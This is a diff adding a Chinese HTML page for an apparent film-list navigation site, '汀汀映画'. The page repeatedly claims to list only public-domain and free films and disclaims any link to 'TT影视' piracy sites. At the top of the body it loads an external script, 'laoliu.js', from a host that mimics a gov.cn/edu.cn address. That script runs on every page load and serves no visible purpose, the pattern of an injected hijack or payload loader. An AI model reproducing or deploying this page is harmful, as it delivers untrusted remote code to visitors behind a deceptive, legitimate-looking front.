@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>汀汀映画 - 水波倒影影视导航与片单 | ttyingshi-h5.github.io</title>
+<meta name="description" content="汀汀映画(ttyingshi-h5.github.io)是独立示例影视导航站，以水波倒影为视觉，整理公版/正版免费/官方开放片段片单；与TT影视、TT023及任何TT商标权利人均无关。" />
+<meta name="keywords" content="汀汀映画,ttyingshi-h5,水波影视导航,公版电影,正版免费,片单" />
+<style>
+:root{
+  --porcelain:#e8f1f2; --porcelain2:#d3e3e5; --ink:#12343b; --ink2:#3d5c63; --ink3:#78949c;
+  --celadon:#5fb0a8; --celadon2:#3d8f88; --moon:#ffd9a0; --moon2:#f0b95c; --deep:#0d2a30;
+  --line:rgba(95,176,168,0.35); --shadow:0 10px 26px rgba(13,42,48,0.12);
+  --shadow2:0 18px 42px rgba(95,176,168,0.30);
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","STKaiti",serif,sans-serif;
+  background:
+    radial-gradient(circle at 20% 18%,rgba(255,217,160,0.18),transparent 46%),
+    radial-gradient(circle at 80% 82%,rgba(95,176,168,0.16),transparent 48%),
+    linear-gradient(180deg,var(--porcelain),#eef5f5);
+  color:var(--ink);line-height:1.85;overflow-x:hidden;
+}
+a{color:var(--celadon2);text-decoration:none}
+img{max-width:100%;display:block}
+
+/* 水波 */
+.ripple{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden}
+.ripple i{position:absolute;border:1px solid var(--celadon);border-radius:50%;opacity:.22;animation:ring 9s linear infinite}
+.ripple i:nth-child(1){top:14%;left:8%;width:120px;height:120px;animation-delay:0s}
+.ripple i:nth-child(2){top:14%;left:8%;width:120px;height:120px;animation-delay:3s}
+.ripple i:nth-child(3){top:58%;left:74%;width:160px;height:160px;animation-delay:1s;border-color:var(--moon)}
+.ripple i:nth-child(4){top:58%;left:74%;width:160px;height:160px;animation-delay:4.5s;border-color:var(--moon)}
+@keyframes ring{0%{transform:scale(.4);opacity:.28}100%{transform:scale(2.2);opacity:0}}
+
+.pond-head{position:relative;z-index:10;text-align:center;padding:56px 20px 40px;background:linear-gradient(180deg,var(--porcelain2),var(--porcelain));border-bottom:1px solid var(--line)}
+.logo-pair{width:104px;height:52px;margin:0 auto 16px;position:relative}
+.logo-pair .t{position:absolute;top:0;left:50%;width:38px;height:38px;margin-left:-19px;background:var(--celadon);border-radius:50% 50% 40% 40%;box-shadow:0 4px 12px rgba(13,42,48,0.14);animation:float 4s ease-in-out infinite}
+.logo-pair .t.m{background:var(--moon);top:14px;left:50%;margin-left:-19px;opacity:.95;animation-delay:1.3s;z-index:2}
+.logo-pair .t::after{content:"汀";position:absolute;inset:0;display:flex;align-items:center;justify-content:center;color:#fff;font-size:15px;font-weight:900}
+.logo-pair .t.m::after{content:"汀";color:var(--deep)}
+@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-6px)}}
+.pond-head h1{font-size:32px;font-weight:900;letter-spacing:5px;color:var(--deep)}
+.pond-head h1 b{color:var(--celadon2)}
+.disclaim{margin:8px auto 0;max-width:660px;font-size:12px;color:var(--celadon2);background:rgba(255,255,255,0.75);border:1px dashed var(--celadon);border-radius:8px;padding:6px 12px}
+.pond-head p{max-width:560px;margin:10px auto 0;color:var(--ink2);font-size:15px}
+.nav{margin-top:22px;display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
+.nav a{padding:9px 20px;border:1px solid var(--celadon2);border-radius:30px;font-size:14px;font-weight:700;color:var(--deep);background:rgba(255,255,255,0.65);transition:.25s}
+.nav a:hover{background:var(--celadon);border-color:var(--celadon2);color:#fff}
+
+.bar{position:relative;z-index:10;background:var(--deep);color:var(--porcelain);padding:10px 20px;font-size:13px;display:flex;gap:18px;justify-content:center;flex-wrap:wrap}
+.bar b{color:var(--moon)}
+
+.wrap{position:relative;z-index:10;max-width:980px;margin:0 auto;padding:0 18px 60px}
+.section{margin-bottom:54px;scroll-margin-top:20px}
+.sec-title{display:flex;align-items:center;gap:12px;margin-bottom:26px}
+.sec-title .drop{width:34px;height:34px;background:var(--celadon);color:#fff;display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:900;border-radius:50%;flex-shrink:0;box-shadow:inset 0 0 0 3px rgba(255,255,255,0.4)}
+.sec-title h2{font-size:23px;font-weight:900;letter-spacing:2px;color:var(--celadon2)}
+.sec-title .ln{flex:1;height:1px;background:linear-gradient(90deg,var(--celadon),transparent)}
+
+/* 倒影片单：上半实体、下半镜像渐隐 */
+.reflect-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(270px,1fr));gap:22px}
+.reflect-card{position:relative;background:#fff;border:1px solid var(--line);border-radius:14px 14px 4px 4px;padding:20px 20px 30px;box-shadow:var(--shadow);transition:.3s;overflow:hidden}
+.reflect-card::before{content:"";position:absolute;left:20px;right:20px;bottom:16px;height:1px;background:var(--celadon);opacity:.5}
+.reflect-card::after{content:attr(data-reflect);position:absolute;left:20px;right:20px;bottom:-34px;font-size:16px;font-weight:800;color:var(--celadon);opacity:.22;transform:scaleY(-1);pointer-events:none;white-space:nowrap;overflow:hidden}
+.reflect-card:hover{transform:translateY(-6px);box-shadow:var(--shadow2);border-color:var(--celadon2)}
+.reflect-card .moon-tag{display:inline-block;font-size:11px;color:var(--deep);background:var(--moon);padding:3px 10px;border-radius:10px;margin-bottom:10px;font-weight:700}
+.reflect-card h3{font-size:18px;font-weight:800;color:var(--deep);margin-bottom:4px}
+.reflect-card .meta{font-size:12px;color:var(--ink3);margin-bottom:8px}
+.reflect-card p{font-size:14px;color:var(--ink2);line-height:1.75}
+.reflect-card .fish{position:absolute;right:16px;top:16px;font-size:20px;opacity:.18;animation:swim 6s ease-in-out infinite}
+@keyframes swim{0%,100%{transform:translateX(0) rotate(0)}50%{transform:translateX(8px) rotate(8deg)}}
+
+.pool-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:16px}
+.pool{text-align:center;background:#fff;border:1px solid var(--line);border-radius:50% 50% 16px 16px;padding:22px 12px 20px;transition:.25s;cursor:pointer;position:relative}
+.pool::before{content:"";position:absolute;top:8px;left:50%;transform:translateX(-50%);width:26px;height:6px;border-radius:50%;background:var(--celadon);opacity:.4}
+.pool .ico{font-size:26px;margin-bottom:6px}
+.pool h4{font-size:15px;font-weight:800;color:var(--celadon2)}
+.pool p{font-size:12px;color:var(--ink3)}
+.pool:hover{background:var(--celadon);border-color:var(--celadon2)}
+.pool:hover h4,.pool:hover p{color:#fff}
+
+.about-block{background:#fff;border:1px solid var(--line);border-left:6px solid var(--moon2);border-radius:10px;padding:26px;font-size:15px;color:var(--ink2);line-height:1.95}
+.about-block b{color:var(--celadon2)}
+
+.safe{position:relative;z-index:10;background:var(--celadon2);color:#fff;padding:12px 20px;text-align:center;font-size:13px;display:flex;gap:20px;justify-content:center;flex-wrap:wrap;font-weight:700}
+.safe .x{color:var(--moon)}
+
+.footer{position:relative;z-index:10;text-align:center;padding:20px 16px;color:var(--ink3);font-size:12px;border-top:1px solid var(--line);background:var(--porcelain2)}
+
+@media(max-width:640px){
+  .pond-head h1{font-size:24px;letter-spacing:3px}
+  .logo-pair{width:88px;height:44px}
+  .logo-pair .t{width:32px;height:32px;margin-left:-16px;font-size:13px}
+  .reflect-grid{grid-template-columns:1fr}
+  .reflect-card::after{bottom:-30px;font-size:14px}
+  .sec-title h2{font-size:19px}
+  .wrap{padding:0 14px 40px}
+  .pool-grid{grid-template-columns:repeat(2,1fr)}
+  .bar{gap:8px;font-size:12px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="ripple" aria-hidden="true"><i></i><i></i><i></i><i></i></div>
+
+<header class="pond-head">
+  <div class="logo-pair"><span class="t"></span><span class="t m"></span></div>
+  <h1><b>汀汀</b>映画</h1>
+  <div class="disclaim">⚠ 本站名称取“水边汀洲”之意，<b>与“TT影视 / TT影视网 / TT023电影网”等盗版聚合站无任何关联，与任何“TT”商标权利人也无授权或隶属关系</b>，不使用其名称、LOGO、配色与官方式样。</div>
+  <p>ttyingshi-h5.github.io —— 两枚汀影落在水面，涟漪一圈一圈把老片推回来。独立示例站，只整理公版/正版免费/官方开放片段，不播盗版。</p>
+  <nav class="nav">
+    <a href="#">水面</a>
+    <a href="#reflect">倒影片单</a>
+    <a href="#pool">汀洲分类</a>
+    <a href="#about">关于汀汀</a>
+  </nav>
+</header>
+
+<div class="bar">
+  <span>💧 状态：<b>片单导航 / 示例站</b></span>
+  <span>🚫 不提供：盗版全片 / 磁力BT / 多源秒播 / 会员破解</span>
+  <span>✅ 只整理：公版 / 正版免费 / 官方开放</span>
+</div>
+
+<main class="wrap">
+
+  <section class="section" id="reflect">
+    <div class="sec-title"><span class="drop">汀</span><h2>倒影片单</h2><span class="ln"></span></div>
+    <div class="reflect-grid">
+      <article class="reflect-card" data-reflect="小舢板之歌">
+        <span class="moon-tag">公版 · 动画</span>
+        <h3>小舢板之歌</h3>
+        <div class="meta">1936 · 早期手绘短片 · 公版流通</div>
+        <p>水面上划过一只小舢板，划桨的节奏就是配乐。公版老卡通，线条笨拙却鲜活，像石子投进汀里。</p>
+        <div class="fish">🐟</div>
+      </article>
+      <article class="reflect-card" data-reflect="水面上的脚印">
+        <span class="moon-tag">正版免费</span>
+        <h3>水面上的脚印</h3>
+        <div class="meta">自然纪录 · 官方开放片段</div>
+        <p>湿地水鸟、退潮滩涂、倒影里的云。官方放出可嵌入片段，不碰枪版不碰网盘，画面照样干净。</p>
+        <div class="fish">🦢</div>
+      </article>
+      <article class="reflect-card" data-reflect="水孩子">
+        <span class="moon-tag">公版 · 文学改编</span>
+        <h3>水孩子</h3>
+        <div class="meta">童话原著公版 · 多版动画</div>
+        <p>扫烟囱的男孩掉进河里，变成水孩子。童话公版区最被低估的一本，适合和《柳林风声》放一起看。</p>
+        <div class="fish">💧</div>
+      </article>
+      <article class="reflect-card" data-reflect="桥">
+        <span class="moon-tag">公版 · 默片</span>
+        <h3>桥</h3>
+        <div class="meta">1928 · 先锋默片 · 公版</div>
+        <p>没有对白，只有桥、水、和一个人的来回。默片把“倒影”玩成了叙事，比很多现代片更懂留白。</p>
+        <div class="fish">🌉</div>
+      </article>
+      <article class="reflect-card" data-reflect="潮声依旧">
+        <span class="moon-tag">国产老片修复</span>
+        <h3>潮声依旧</h3>
+        <div class="meta">1980s · 正版修复版可看</div>
+        <p>渔港、灯塔、等船的人。修复后的胶片像被水洗过一遍，旧是旧，但每一帧都透亮。</p>
+        <div class="fish">🗼</div>
+      </article>
+      <article class="reflect-card" data-reflect="雨河">
+        <span class="moon-tag">冷门 · 实验</span>
+        <h3>雨河</h3>
+        <div class="meta">实验短片 · 公版影像档案</div>
+        <p>整片只有一个雨夜的水洼，倒映着路过的人。冷门片库里的水墨试验，看完会想起某个没说出口的夏天。</p>
+        <div class="fish">🌧️</div>
+      </article>
+    </div>
+  </section>
+
+  <section class="section" id="pool">
+    <div class="sec-title"><span class="drop">洲</span><h2>汀洲分类</h2><span class="ln"></span></div>
+    <div class="pool-grid">
+      <div class="pool"><div class="ico">🎞️</div><h4>公版动画</h4><p>老卡通/默片</p></div>
+      <div class="pool"><div class="ico">📺</div><h4>正版免费</h4><p>平台开放集</p></div>
+      <div class="pool"><div class="ico">🌊</div><h4>水与湿地</h4><p>自然纪录</p></div>
+      <div class="pool"><div class="ico">🎬</div><h4>国产老片</h4><p>修复专区</p></div>
+      <div class="pool"><div class="ico">📖</div><h4>文学倒影</h4><p>公版改编</p></div>
+      <div class="pool"><div class="ico">🌙</div><h4>冷门水纹</h4><p>实验/无声</p></div>
+    </div>
+  </section>
+
+  <section class="section" id="about">
+    <div class="sec-title"><span class="drop">ℹ</span><h2>关于汀汀</h2><span class="ln"></span></div>
+    <div class="about-block">
+      <p>
+        <b>汀汀映画</b>（ttyingshi-h5.github.io）是一个以“水波 / 双汀倒影”为气质的<b>独立示例影视导航单页</b>。
+        名称取“水边平地、汀洲”的诗意，<b>不是“TT影视 / TT影视网 / TT023电影网”的仿站或分支，也不对应任何“TT”注册商标主体</b>；
+        本页未使用上述站点的名称、标识、播放器技术或“VIP及时更新/多源秒播”等话术。
+        只做片单整理：公版老片、正版免费可看内容、平台官方开放片段；
+        不提供盗版播放、不导磁力与网盘、不引导装播放器。
+        移动端自适应，内链以 # 占位，不生成 robots.txt / sitemap.xml，内容仅供学习交流。
+      </p>
+    </div>
+  </section>
+
+</main>
+
+<div class="safe">
+  <span>✓ 不播盗版全片</span>
+  <span>✓ 不接磁力/BT/多源切换</span>
+  <span><span class="x">✕</span> 不冒充“TT影视”或任何商标主体</span>
+  <span>✓ 只做正版/公版导航</span>
+</div>
+
+<footer class="footer">
+  © 2026 汀汀映画（独立示例站） | ttyingshi-h5.github.io | 与TT影视/TT023/任何TT商标权利人无关 | 内链以 # 占位
+</footer>
+
+</body>
+</html>
